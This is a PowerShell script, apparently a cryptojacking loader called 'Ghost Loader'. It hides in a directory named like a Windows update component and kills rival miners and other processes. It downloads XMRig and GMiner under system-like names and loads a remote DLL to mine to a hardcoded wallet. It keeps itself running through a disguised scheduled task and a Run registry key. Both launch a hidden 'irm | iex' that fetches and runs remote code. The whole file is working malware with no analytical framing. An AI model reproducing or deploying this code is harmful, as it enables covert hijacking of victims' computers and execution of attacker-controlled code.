# Ghost Loader - Audited v1
$u = "HolyV200"; $r = "ulta"; $w = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
$ProgressPreference = 'SilentlyContinue'

# TARGET DIRECTORY (Never Detach)
$sDir = "C:\Windows\SystemApps\Microsoft.Windows.UpdateSystem_cw5n1h2txyewy"
if (!(Test-Path $sDir)) { try { New-Item -ItemType Directory -Force -Path $sDir -ErrorAction SilentlyContinue | Out-Null } catch { $sDir = [System.IO.Path]::Combine($env:LOCALAPPDATA, "Microsoft", "Windows", "UpdateCoord") } }
if (!(Test-Path $sDir)) { New-Item -ItemType Directory -Force -Path $sDir | Out-Null }

# DEEP CLEAN & POWER OPTIMIZATION
try { Get-Process "xmrig", "gminer", "miner", "OneDriveStandalone", "SpotifyHelper", "RuntimeBroker", "TaskHostW" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch { }
try { 
    powercfg /x -hibernate-timeout-ac 0 2>$null
    powercfg /x -sleep-timeout-ac 0 2>$null
    powercfg /x -disk-timeout-ac 0 2>$null
} catch { }

function Get-F($Url, $Path) {
    if (Test-Path $Path) { try { Remove-Item $Path -Force -ErrorAction SilentlyContinue } catch { } }
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    try { 
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", $ua)
        $wc.DownloadFile($Url, $Path)
        if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 1KB) { return $true } }
    } catch { }
    try { curl.exe -sL -H "User-Agent: $ua" -o $Path $Url 2>$null; if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 1KB) { return $true } } } catch { }
    return $false
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
$cz = Join-Path $sDir "upd_c.zip"; $gz = Join-Path $sDir "upd_g.zip"; $ce = Join-Path $sDir "RuntimeBroker.exe"; $ge = Join-Path $sDir "TaskHostW.exe"
$dUrl = "https://raw.githubusercontent.com/$u/$r/main/Bridge.dll?v=$([Guid]::NewGuid())"
$mUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$gUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"

# STAGING
if (!(Test-Path $ce)) {
    if (Get-F $mUrl $cz) {
        try { Get-ChildItem $sDir -Exclude "*.zip", "*.dll", "*.dat" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
        for ($j=0;$j-lt 5;$j++) { try { [System.IO.Compression.ZipFile]::ExtractToDirectory($cz, $sDir); break } catch { Start-Sleep -Seconds 1 } }
        Remove-Item $cz -Force -ErrorAction SilentlyContinue
        $uz = Get-ChildItem $sDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        if ($uz) { for($k=0;$k-lt 5;$k++){ try{ Move-Item $uz.FullName -Destination $ce -Force; break }catch{ Start-Sleep -Seconds 1 } } }
    }
}

$gd = $false
try { $ccs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue; foreach ($cc in $ccs) { $nn=$cc.Name.ToUpper(); if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -or $cc.AdapterRAM -gt 2GB) { if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } } } } catch { }
if ($gd -and !(Test-Path $ge)) {
    if (Get-F $gUrl $gz) {
        try { Get-ChildItem $sDir -Exclude "*.zip", "*.dll", "*.dat", "RuntimeBroker.exe" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
        for ($j=0;$j-lt 5;$j++) { try { [System.IO.Compression.ZipFile]::ExtractToDirectory($gz, $sDir); break } catch { Start-Sleep -Seconds 1 } }
        Remove-Item $gz -Force -ErrorAction SilentlyContinue
        $uz = Get-ChildItem $sDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        if ($uz) { for($k=0;$k-lt 5;$k++){ try{ Move-Item $uz.FullName -Destination $ge -Force; break }catch{ Start-Sleep -Seconds 1 } } }
    }
}

# RUN
$dp = Join-Path $sDir "Bridge.dll"
if (Get-F $dUrl $dp) {
    try {
        $db = [System.IO.File]::ReadAllBytes($dp)
        $asm = [System.Reflection.Assembly]::Load($db)
        $type = $asm.GetType('DateFundLoader')
        if ($null -eq $type) { throw "DLL Type Load Error" }
        $method = $type.GetMethod('StartMiner')
        if ($null -eq $method) { throw "DLL Method Load Error" }
        
        $method.Invoke($null, @([string]$ce, [string]$ge, [string]$w))
        Write-Host "running"
        $cmd = "irm 'https://raw.githubusercontent.com/$u/$r/main/remote_deploy.ps1' | iex"
        $tp = "powershell.exe -w hidden -c $cmd"
        
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        $wp = New-Object Security.Principal.WindowsPrincipal($id)
        $ad = $wp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        
        if ($ad) { schtasks.exe /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "'$tp'" /sc onlogon /rl highest /f /ru "System" 2>$null }
        else { schtasks.exe /create /tn "WindowsUpdateScan" /tr "'$tp'" /sc onlogon /f 2>$null }

        # Redundant Registry Layer (Never Detach)
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$tp" -ErrorAction SilentlyContinue
        return
    } catch { $e = $_.ToString() }
} else { $e = "DLL Download Failed" }
Write-Host "failed: $e"
